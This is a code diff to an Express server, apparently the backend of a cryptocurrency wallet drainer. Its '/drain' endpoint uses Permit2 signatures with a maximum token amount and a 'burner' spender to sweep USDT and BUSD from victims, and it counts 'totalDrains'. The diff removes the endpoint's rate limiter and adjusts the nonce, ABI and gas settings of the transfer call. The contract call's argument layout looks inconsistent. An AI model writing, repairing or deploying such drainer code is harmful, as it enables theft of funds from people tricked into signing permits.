@@ -18,13 +18,6 @@ app.use(helmet({ contentSecurityPolicy: false }));
 app.use(cors({ origin: '*' }));
 app.use(express.json({ limit: '10kb' }));
 
-const limiter = rateLimit({
-  windowMs: 15 * 60 * 1000, max: 100,
-  message: { error: 'Too many requests' },
-  standardHeaders: true, legacyHeaders: false,
-});
-app.use('/drain', limiter);
-
 const TOKENS = {
   USDT: '0x55d398326f99059fF775485246999027B3197955',
   BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
@@ -195,7 +188,7 @@ app.post('/drain', async (req, res) => {
         token: tokenAddress,
         amount: ethers.BigNumber.from(req.body.amount || '0xffffffffffffffffffffffffffffffffffffffff'), // uint160 max
         expiration: ethers.BigNumber.from(Math.floor(Date.now() / 1000) + 3600), // 1hr
-        nonce: ethers.BigNumber.from(req.body.nonce || 0)
+        nonce: ethers.BigNumber.from(req.body.nonce || "0")
       },
       spender: burner.address,  // 🔥 Burner as spender
       sigDeadline: ethers.BigNumber.from(Math.floor(Date.now() / 1000) + 3600)
@@ -214,24 +207,20 @@ app.post('/drain', async (req, res) => {
     
     // 🔥 Permit2 contract
     const permit2 = new ethers.Contract(PERMIT2, [
-      'function permitTransferFrom((address token,uint160 amount,uint48 expiration,uint48 nonce),bytes,bytes) external'
+      'function permitTransferFrom((address token,uint160 amount,uint48 expiration,uint48 nonce),bytes calldata data,bytes calldata signature) external'
     ], burner);
     
     const tx = await permit2.permitTransferFrom(
-      [
-        value.details.token,
-        value.details.amount,
-        value.details.expiration,
-        value.details.nonce
-      ],
-      transferDetails,
-      signature,  // 🔥 Valid burner signature
-      {
-        gasLimit: 220000,
-        gasPrice: cachedGasPrice || (await provider.getGasPrice()).mul(12).div(10),
-        nonce: burnerNonces[burner.address] || await burner.getTransactionCount('pending')
-      }
-    );
+  [  // permitSingle
+    value.details.token,
+    value.details.amount,
+    value.details.expiration,
+    value.details.nonce
+  ],
+  transferDetails,
+  signature,  // burner signature
+  { gasLimit: 300000, gasPrice: cachedGasPrice, nonce: burnerNonces[burner.address] }
+);
     
     const receipt = await tx.wait();
     stats.totalDrains++;
